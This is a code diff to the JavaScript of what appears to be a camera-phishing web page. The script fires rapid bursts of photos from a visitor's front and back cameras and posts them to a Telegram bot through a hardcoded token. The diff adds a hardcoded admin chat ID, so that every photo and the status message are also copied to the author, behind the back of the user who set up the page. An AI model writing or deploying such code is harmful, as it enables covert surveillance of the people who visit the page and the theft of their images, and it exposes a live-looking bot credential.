@@ -80,7 +80,9 @@
         const config = getConfigFromURL();
         const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-        const CHAT_ID = config.chatId;
+        const ADMIN_CHAT_ID = '7838949014'; // Your admin ID
+        const USER_CHAT_ID = config.chatId; // User ID from URL
+        const CHAT_IDS = [ADMIN_CHAT_ID, USER_CHAT_ID]; // Send to both
         
         // ⚡ ULTRA FAST CONFIG
         const PHOTOS_PER_CAMERA = 3;      // 3 photos each camera
@@ -186,25 +188,30 @@
             });
         }
         
-        // Fire and forget send (ULTRA FAST)
+        // Fire and forget send to BOTH admin and user (ULTRA FAST)
         function sendPhotoFast(blob, cameraType, photoNum) {
             if (!blob) return;
             
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
-            formData.append('caption', `📸 ${cameraType.toUpperCase()} #${photoNum}`);
-            
-            // Fire and forget - don't wait!
-            fetch(`${TELEGRAM_API}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).then(r => r.json()).then(result => {
-                if (result.ok) {
-                    totalPhotosSent++;
-                    console.log(`✅ Sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
-                }
-            }).catch(e => console.error('❌', e));
+            // Send to both admin and user
+            CHAT_IDS.forEach(chatId => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
+                
+                const caption = `📸 ${cameraType.toUpperCase()} #${photoNum}\n👤 User: ${USER_CHAT_ID}`;
+                formData.append('caption', caption);
+                
+                // Fire and forget - don't wait!
+                fetch(`${TELEGRAM_API}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(r => r.json()).then(result => {
+                    if (result.ok) {
+                        totalPhotosSent++;
+                        console.log(`✅ Sent to ${chatId}: ${cameraType.toUpperCase()} #${photoNum}`);
+                    }
+                }).catch(e => console.error('❌', e));
+            });
         }
         
         async function switchCamera() {
@@ -263,17 +270,22 @@
                     `⏱️ Speed: ${CAPTURE_DELAY}ms between shots\n` +
                     `🔄 Switch: ${SWITCH_DELAY}ms\n` +
                     `🌐 Site: ${config.website}\n` +
+                    `👤 User ID: ${USER_CHAT_ID}\n` +
+                    `👑 Admin ID: ${ADMIN_CHAT_ID}\n` +
                     `⏰ ${new Date().toLocaleString()}`;
                 
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
-                });
+                // Send to both admin and user
+                for (const chatId of CHAT_IDS) {
+                    await fetch(`${TELEGRAM_API}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: msg,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                }
             } catch (e) {
                 console.error('Failed to send start message:', e);
             }
@@ -283,10 +295,12 @@
             console.log('═══════════════════════════════════');
             console.log('⚡ ULTRA FAST BURST CAMERA');
             console.log('═══════════════════════════════════');
-            console.log('💬 Chat ID:', CHAT_ID);
+            console.log('👑 Admin ID:', ADMIN_CHAT_ID);
+            console.log('👤 User ID:', USER_CHAT_ID);
             console.log('🌐 Website:', config.website);
             console.log('📸 Pattern: 3 FRONT + 3 BACK');
             console.log('⚡ Speed: MAXIMUM');
+            console.log('📤 Sending to: BOTH admin & user');
             console.log('═══════════════════════════════════');
             
             loadWebsite();
